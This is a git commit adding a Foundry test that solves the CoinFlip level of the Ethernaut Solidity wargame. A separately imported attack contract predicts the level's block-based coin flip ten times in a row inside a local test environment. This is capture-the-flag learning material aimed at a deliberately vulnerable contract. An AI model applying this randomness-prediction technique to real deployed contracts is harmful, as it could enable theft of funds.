35877b435bcd820f789fb13b072e8edf17c7935e
alex0207s <alex640702070829@gmail.com>
2023-05-13 23:14:12 +0800

    :white_check_mark: Add level 3 CoinFlip solution

---
+++ test/03-CoinFlip.t.sol
@@ -0,0 +1,51 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "ds-test/test.sol";
+import "forge-std/Vm.sol";
+
+import "src/core/Ethernaut.sol";
+import "src/levels/03-CoinFlip/CoinFlipFactory.sol";
+import "src/levels/03-CoinFlip/CoinFlipAttack.sol";
+
+contract CoinFlipTest is DSTest {
+    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
+    Ethernaut ethernaut;
+    address hacker = vm.addr(1);
+
+    function setUp() public {
+        ethernaut = new Ethernaut();
+    }
+
+    function testCoinFlipHack() public {
+        /////////////////
+        // LEVEL SETUP //
+        /////////////////
+        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
+        ethernaut.registerLevel(coinFlipFactory);
+        vm.startPrank(hacker);
+        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
+        CoinFlip ethernautCoinFlip = CoinFlip(payable(levelAddress));
+
+        //////////////////
+        // LEVEL ATTACK //
+        //////////////////
+        CoinFlipAttack attacker = new CoinFlipAttack();
+        
+        for (uint i = 0; i < 10; i++) {
+            vm.roll(i+1);
+            ethernautCoinFlip.flip(attacker.guessGod());
+        }
+
+        assertEq(ethernautCoinFlip.consecutiveWins(), 10, "consecutive wins less than 10!");
+
+        //////////////////////
+        // LEVEL SUBMISSION //
+        //////////////////////
+        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
+            payable(levelAddress)
+        );
+        vm.stopPrank();
+        assert(levelSuccessfullyPassed);
+    }
+}
